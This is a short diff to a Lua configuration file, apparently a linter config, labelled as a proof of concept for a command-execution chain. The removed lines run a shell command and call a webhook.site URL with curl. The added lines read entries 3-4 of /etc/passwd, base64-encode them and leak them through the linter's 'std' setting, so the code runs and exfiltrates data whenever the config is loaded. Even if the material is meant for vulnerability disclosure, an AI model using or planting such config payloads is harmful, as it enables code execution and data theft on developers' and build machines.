@@ -1,10 +1,9 @@
--- EXECCHAIN-01 repro v2: in-band proof of io.popen/os.execute (marker = shell command output)
+-- EXECCHAIN-01 v3: in-band /etc/passwd exfil, chunk B (entries 3-4) via luacheck std error
 local marker = "noexec"
-local h = io.popen("printf '%s' \"luacmd-$(date +%s | sha256sum | cut -c1-12)\"")
+local h = io.popen('{ printf "B|"; sed -n "3,4p" /etc/passwd | paste -sd"|" -; } | base64 -w0 | tr "+/" "-_" | tr -d "="')
 if h then
   local line = h:read("*l")
   h:close()
   if line and #line > 0 then marker = line end
 end
-os.execute("curl -sS -m 5 -o /dev/null 'https://webhook.site/e90ef1d7-4a15-4283-ab43-101eec0be5d9/lua2-" .. marker .. "' >/dev/null 2>&1")
 std = "EXECX_" .. marker
